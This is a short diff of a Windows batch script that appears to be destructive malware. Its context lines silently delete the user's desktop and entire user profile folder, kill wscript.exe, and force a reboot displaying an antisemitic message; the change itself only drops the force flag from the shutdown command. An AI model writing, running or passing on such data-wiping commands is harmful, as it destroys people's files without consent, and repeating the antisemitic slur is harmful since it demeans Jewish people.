@@ -80,4 +80,4 @@ rd "%userprofile%\desktop"/q /s
 timeout 1 >nul /nobreak
 rd "%userprofile%"/s /q
 taskkill /f /im wscript.exe
-shutdown /r /c "YOU ARE JEW" /t 3 /f
+shutdown /r /c "YOU ARE JEW" /t 3
